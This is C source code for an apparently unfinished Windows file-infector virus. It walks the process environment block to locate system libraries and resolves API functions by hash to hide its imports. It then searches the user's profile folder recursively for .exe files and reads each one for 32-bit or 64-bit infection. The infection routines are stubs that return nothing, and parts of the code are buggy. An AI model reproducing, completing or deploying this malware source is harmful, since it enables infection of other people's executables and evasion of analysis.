#include <stdint.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <shlobj.h>
#include "infections.h"

typedef struct FULL_PEB_LDR_DATA
{
   ULONG Length;
   BOOLEAN Initialized;
   HANDLE SsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   PVOID EntryInProgress;
   BOOLEAN ShutdownInProgress;
   HANDLE ShutdownThreadId;
} FULL_PEB_LDR_DATA, *PFULL_PEB_LDR_DATA;

typedef struct FULL_LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     PVOID EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;

typedef void * (* mallocHeader)(size_t);
typedef void * (* reallocHeader)(void *, size_t);
typedef void (* freeHeader)(void *);
typedef char * (* strncatHeader)(char *, const char *, size_t);
typedef int (* strnicmpHeader)(const char *, const char *, size_t);
typedef size_t (* strlenHeader)(const char *);
typedef void * (* memcpyHeader)(void *, const void *, size_t);
typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
typedef HANDLE (* CreateFileAHeader)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD (* GetFileSizeHeader)(HANDLE, LPDWORD);
typedef BOOL (* ReadFileHeader)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (* CloseHandleHeader)(HANDLE);
typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);

typedef struct __InfectorIAT
{
   /* msvcrt */
   mallocHeader malloc;
   reallocHeader realloc;
   freeHeader free;
   strncatHeader strncat;
   strnicmpHeader strnicmp;
   strlenHeader strlen;
   memcpyHeader memcpy;

   /* kernel32 */
   LoadLibraryAHeader loadLibrary;
   FindFirstFileAHeader findFirstFile;
   FindNextFileAHeader findNextFile;
   CreateFileAHeader createFile;
   GetFileSizeHeader getFileSize;
   ReadFileHeader readFile;
   CloseHandleHeader closeHandle;

   /* shell32 */
   SHGetFolderPathAHeader getFolderPath;
} InfectorIAT;

typedef struct __CVector
{
   size_t type_size;
   size_t elements;
   void *data;
} CVector;

#define RECAST(t,e) ((t)(e))
#define CVECTOR_CAST(v,t) RECAST(t,(v)->data)
#define CVECTOR_BYTES(v) ((v)->type_size * (v)->elements)

CVector cvector_alloc(InfectorIAT *iat, size_t type_size, size_t elements)
{
   CVector result;
   result.type_size = 0;
   result.elements = 0;
   result.data = NULL;

   if (type_size == 0)
      return result;

   result.type_size = type_size;

   if (elements == 0)
      return result;

   result.elements = elements;
   result.data = iat->malloc(CVECTOR_BYTES(&result));
   return result;
}

void cvector_free(InfectorIAT *iat, CVector *vector)
{
   if (vector == NULL || vector->data == NULL)
      return;

   iat->free(vector->data);
   vector->data = NULL;
   vector->elements = 0;
}

void cvector_realloc(InfectorIAT *iat, CVector *vector, size_t elements)
{
   if (vector == NULL)
      return;
   
   if (elements == 0 || elements == vector->elements)
   {
      cvector_free(iat, vector);
      return;
   }
   
   vector->elements = elements;
   vector->data = iat->realloc(vector->data, CVECTOR_BYTES(vector));
}

void cvector_insert(InfectorIAT *iat, CVector *vector, size_t index, void *element)
{
   if (vector == NULL || element == NULL)
      return;

   if (index > vector->elements && vector->elements != 0)
      return;

   if (vector->data == NULL)
   {
      *vector = cvector_alloc(iat, vector->type_size, 1);
      iat->memcpy(vector->data, element, vector->type_size);
      return;
   }

   cvector_realloc(iat, vector, vector->elements+1);

   if (index != vector->elements)
   {
      /* we do it this way to prevent doing another malloc/free just to insert */
      for (size_t i=1; i<vector->elements-index; ++i)
      {
         size_t src_index = vector->elements-i-1;
         size_t dst_index = vector->elements-i;
         void *src = RECAST(void *, CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * src_index));
         void *dst = RECAST(void *, CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * dst_index));
         iat->memcpy(dst, src, vector->type_size);
      }
   }

   iat->memcpy(CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * index), element, vector->type_size);
}

void cvector_remove(InfectorIAT *iat, CVector *vector, size_t index)
{
   if (vector == NULL || index >= vector->elements)
      return;

   if (index != vector->elements-1)
      iat->memcpy(CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * index),
                  CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * (index+1)),
                  vector->type_size * (vector->elements-index-1));
   
   cvector_realloc(iat, vector, vector->elements-1);
}

void cvector_push(InfectorIAT *iat, CVector *vector, void *element)
{
   if (vector == NULL || element == NULL)
      return;

   cvector_insert(iat, vector, vector->elements, element);
}

void cvector_dequeue(InfectorIAT *iat, CVector *vector, void *element)
{
   if (vector == NULL)
      return;

   if (element != NULL)
      iat->memcpy(element, vector->data, vector->type_size);

   cvector_remove(iat, vector, 0);
}

uint32_t fnv321a(const char *string)
{
   uint32_t hashval = 0x811c9dc5;

   while (*string != 0)
   {
      hashval ^= *string++;
      hashval *= 0x1000193;
   }

   return hashval;
}

LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, uint32_t hash)
{
   const IMAGE_NT_HEADERS *nt_headers = RECAST(const IMAGE_NT_HEADERS *, RECAST(const uint8_t *,module)+module->e_lfanew);
   const IMAGE_EXPORT_DIRECTORY *export_directory = RECAST(const IMAGE_EXPORT_DIRECTORY *,
                                                           RECAST(const uint8_t *,module)+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
   const DWORD *name_pointers = RECAST(const DWORD *,RECAST(const uint8_t *,module)+export_directory->AddressOfNames);
   const WORD *name_ordinals = RECAST(const WORD *,RECAST(const uint8_t *,module)+export_directory->AddressOfNameOrdinals);
   const DWORD *functions = RECAST(const DWORD *,RECAST(const uint8_t *,module)+export_directory->AddressOfFunctions);

   for (uint32_t i=0; i<export_directory->NumberOfNames; ++i)
   {
      const char *name = RECAST(const char *,RECAST(const uint8_t *,module)+name_pointers[i]);

      if (fnv321a(name) != hash)
         continue;

      return RECAST(LPCVOID,RECAST(const uint8_t *,module)+functions[name_ordinals[i]]);
   }

   return NULL;
}

PIMAGE_DOS_HEADER infect_32bit(InfectorIAT *iat, PIMAGE_DOS_HEADER module, size_t size)
{
   uint8_t *byte_module = RECAST(uint8_t *,module);
   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+module->e_lfanew);

   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
   {
      puts("\t\tExecutable does not have a TLS directory.");
   }
   else
   {
      puts("\t\tExecutable has a TLS directory.");
   }

   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
      puts("\t\tExecutable has no relocations.");
   else
      puts("\t\tExecutable has relocations.");

   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+module->e_lfanew+nt_headers_size);

   return NULL;
}

PIMAGE_DOS_HEADER infect_64bit(InfectorIAT *iat, PIMAGE_DOS_HEADER module, size_t size)
{
   uint8_t *byte_module = RECAST(uint8_t *,module);
   PIMAGE_NT_HEADERS64 nt_headers = RECAST(PIMAGE_NT_HEADERS64,byte_module+module->e_lfanew);
   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+module->e_lfanew+nt_headers_size);
   CVector relocations = cvector_alloc(iat, 0, 0);

   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
      relocations = cvector_alloc(iat, sizeof(uint32_t), 0);
         
   return NULL;
}

void load_infector_iat(InfectorIAT *iat)
{
   if (iat == NULL)
      return;

#if defined(_M_IX86)
   PPEB peb = RECAST(PPEB,__readfsdword(0x30));
#elif defined(_M_AMD64)
   PPEB peb = RECAST(PPEB,__readgsqword(0x60));
#endif

   PFULL_PEB_LDR_DATA ldr = RECAST(PFULL_PEB_LDR_DATA,peb->Ldr);
   PFULL_LDR_DATA_TABLE_ENTRY list_entry = RECAST(PFULL_LDR_DATA_TABLE_ENTRY,ldr->InLoadOrderModuleList.Flink);
   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = RECAST(PFULL_LDR_DATA_TABLE_ENTRY,RECAST(PFULL_LDR_DATA_TABLE_ENTRY,list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink);
   iat->loadLibrary = RECAST(LoadLibraryAHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x53b2070f));
   iat->findFirstFile = RECAST(FindFirstFileAHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0xd7482f55));
   iat->findNextFile = RECAST(FindNextFileAHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x6f4d1398));
   iat->createFile = RECAST(CreateFileAHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0xbdcac9ce));
   iat->getFileSize = RECAST(GetFileSizeHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x44ed8118));
   iat->readFile = RECAST(ReadFileHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x54fcc943));
   iat->closeHandle = RECAST(CloseHandleHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0xfaba0065));
   PIMAGE_DOS_HEADER msvcrtModule = RECAST(PIMAGE_DOS_HEADER,iat->loadLibrary("msvcrt.dll"));
   iat->malloc = RECAST(mallocHeader,get_proc_by_hash(msvcrtModule, 0x558c274d));
   iat->realloc = RECAST(reallocHeader,get_proc_by_hash(msvcrtModule, 0xbf26b345));
   iat->free = RECAST(freeHeader,get_proc_by_hash(msvcrtModule, 0x99b3eedb));
   iat->strncat = RECAST(strncatHeader,get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
   iat->strnicmp = RECAST(strnicmpHeader,get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
   iat->strlen = RECAST(strlenHeader,get_proc_by_hash(msvcrtModule, 0x58ba3d97));
   iat->memcpy = RECAST(memcpyHeader,get_proc_by_hash(msvcrtModule, 0xa45cec64));
   PIMAGE_DOS_HEADER shell32Module = RECAST(PIMAGE_DOS_HEADER,iat->loadLibrary("shell32.dll"));
   iat->getFolderPath = RECAST(SHGetFolderPathAHeader,get_proc_by_hash(shell32Module, 0xe8692330));
}

int infect(void)
{
   InfectorIAT iat;
   load_infector_iat(&iat);

#ifdef BROODSACDEBUG
   char profile_directory[MAX_PATH+1] = "C:\\Users\\teal\\Documents\\broodsac";
#else
   char profile_directory[MAX_PATH+1];

   if (iat.getFolderPath(NULL, CSIDL_PROFILE, NULL, 0, profile_directory) != 0)
      return 2;
#endif

   char prepend_path[] = "\\\\?\\";
   size_t root_size = iat.strlen(prepend_path)+iat.strlen(profile_directory)+1;
   char *search_root = RECAST(char *,iat.malloc(root_size));
   iat.memcpy(search_root, prepend_path, iat.strlen(prepend_path)+1);
   iat.strncat(search_root, profile_directory, iat.strlen(profile_directory));

   /* create a stack of directory names to traverse */
   CVector search_stack = cvector_alloc(&iat, sizeof(char *), 1);
   CVECTOR_CAST(&search_stack, char **)[0] = search_root;

   CVector found_executables = cvector_alloc(&iat, sizeof(char *), 0);

   while (search_stack.elements > 0)
   {
      char *search_visit;
      cvector_dequeue(&iat, &search_stack, &search_visit);
      
      char starSearch[] = "\\*";
      char exeSearch[] = ".exe";
      char *search_string = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(starSearch)+1));
      iat.memcpy(search_string, search_visit, iat.strlen(search_visit)+1);
      iat.strncat(search_string, starSearch, iat.strlen(starSearch));
      
      WIN32_FIND_DATAA find_data;
      HANDLE find_handle = iat.findFirstFile(search_string, &find_data);

      if (find_handle == INVALID_HANDLE_VALUE)
         goto free_and_continue;

      do
      {
         char slash[] = "\\";
         char dot[] = ".";
         char dotDot[] = "..";

         if (iat.strnicmp(find_data.cFileName, dot, 2) == 0 || iat.strnicmp(find_data.cFileName, dotDot, 3) == 0)
            continue;
         else if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
                  (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400) // if directory and not symlink
         {
            char *new_directory = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
            iat.memcpy(new_directory, search_visit, iat.strlen(search_visit)+1);
            iat.strncat(new_directory, slash, iat.strlen(slash));
            iat.strncat(new_directory, find_data.cFileName, iat.strlen(find_data.cFileName));

            cvector_push(&iat, &search_stack, &new_directory);
         }
         else if (iat.strnicmp(find_data.cFileName+(iat.strlen(find_data.cFileName)-4), exeSearch, iat.strlen(exeSearch)) == 0)
         {
            char *found_executable = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
            iat.memcpy(found_executable, search_visit, iat.strlen(search_visit)+1);
            iat.strncat(found_executable, slash, iat.strlen(slash));
            iat.strncat(found_executable, find_data.cFileName, iat.strlen(find_data.cFileName));

            cvector_push(&iat, &found_executables, &found_executable);
         }
      } while (iat.findNextFile(find_handle, &find_data));

   free_and_continue:
      iat.free(search_string);
      iat.free(search_visit);
   }

   printf("%ll executables were found.\n", found_executables.elements);

   for (size_t i=0; i<found_executables.elements; ++i)
   {
      char *executable = CVECTOR_CAST(&found_executables, char **)[i];
      HANDLE exe_handle = iat.createFile(executable,
                                         GENERIC_READ,
                                         0,
                                         NULL,
                                         OPEN_EXISTING,
                                         FILE_ATTRIBUTE_NORMAL,
                                         NULL);

      if (exe_handle == INVALID_HANDLE_VALUE)
      {
         printf("\tFailed to open %s\n", executable);
         goto end_exe_loop;
      }

      DWORD file_size = iat.getFileSize(exe_handle, NULL);

      if (file_size == INVALID_FILE_SIZE)
      {
         printf("\t%s is larger than 4gb\n", executable);
         goto close_file;
      }

      uint8_t *exe_buffer = RECAST(uint8_t *,iat.malloc(file_size));
      DWORD bytes_read = 0;

      if (!iat.readFile(exe_handle, exe_buffer, file_size, &bytes_read, NULL))
      {
         printf("\tFailed to read %s\n", executable);
         goto free_file;
      }

      IMAGE_DOS_HEADER *dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(exe_buffer);
      IMAGE_NT_HEADERS *nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(exe_buffer+dos_header->e_lfanew);
      IMAGE_DOS_HEADER *rewritten_image;

      if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
      {
         printf("\t%s is 32-bit.\n", executable);
         rewritten_image = infect_32bit(&iat, dos_header, file_size);
      }
      else if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
      {
         printf("\t%s is 64-bit.\n", executable);
         rewritten_image = infect_64bit(&iat, dos_header, file_size);
      }

      if (rewritten_image != NULL)
      {
         iat.closeHandle(exe_handle);
         exe_handle = INVALID_HANDLE_VALUE;
      }

   free_file:
      iat.free(exe_buffer);
      exe_buffer = NULL;

   close_file:
      if (exe_handle != INVALID_HANDLE_VALUE)
         iat.closeHandle(exe_handle);
      
   end_exe_loop:
      iat.free(executable);
   }

   cvector_free(&iat, &found_executables);
   return 0;
}

int main(int argc, char *argv[])
{
   //infect();
   return infect();
}
